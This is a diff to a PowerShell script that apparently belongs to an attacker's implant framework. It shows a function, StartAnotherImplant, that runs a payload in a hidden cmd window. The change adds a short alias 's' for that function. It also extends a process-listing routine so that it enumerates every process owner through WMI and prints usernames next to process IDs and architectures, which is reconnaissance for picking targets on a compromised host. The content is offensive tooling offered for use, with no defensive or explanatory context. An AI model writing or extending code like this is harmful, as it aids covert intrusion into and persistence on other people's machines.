@@ -32,6 +32,7 @@ Function StartAnotherImplant {
         start-process -windowstyle hidden cmd -args "/c $payload"
     }
 }
+sal s startanotherimplant
 function Test-Administrator  
 {  
     $user = [Security.Principal.WindowsIdentity]::GetCurrent();
@@ -350,6 +351,10 @@ Function Get-ProcessFull {
 [System.Diagnostics.Process[]] $processes64bit = @()
 [System.Diagnostics.Process[]] $processes32bit = @()
 
+
+$owners = @{}
+gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
+
 $AllProcesses = @()
 
 foreach($process in get-process) {
@@ -358,11 +363,12 @@ foreach($process in get-process) {
         $file = [System.IO.Path]::GetFileName($module.FileName).ToLower()
         if($file -eq "wow64.dll") {
             $processes32bit += $process
-            $pobject = New-Object PSObject | Select ID, StartTime, Name, Arch
+            $pobject = New-Object PSObject | Select ID, StartTime, Name, Arch, Username
             $pobject.Id = $process.Id
             $pobject.StartTime = $process.starttime
             $pobject.Name = $process.Name
             $pobject.Arch = "x86"
+            $pobject.UserName = $owners[$process.Id.tostring()]
             $AllProcesses += $pobject
             break
         }
@@ -370,15 +376,16 @@ foreach($process in get-process) {
 
     if(!($processes32bit -contains $process)) {
         $processes64bit += $process
-        $pobject = New-Object PSObject | Select ID, StartTime, Name, Arch
+        $pobject = New-Object PSObject | Select ID, StartTime, Name, Arch, UserName
         $pobject.Id = $process.Id
         $pobject.StartTime = $process.starttime
         $pobject.Name = $process.Name
         $pobject.Arch = "x64"
+        $pobject.UserName = $owners[$process.Id.tostring()]
         $AllProcesses += $pobject
     }
 }
 
-$AllProcesses|Select ID, Arch, Name, StartTime | format-table -wrap
+$AllProcesses|Select ID, Arch, Name, UserName, StartTime | format-table -auto
 
 }
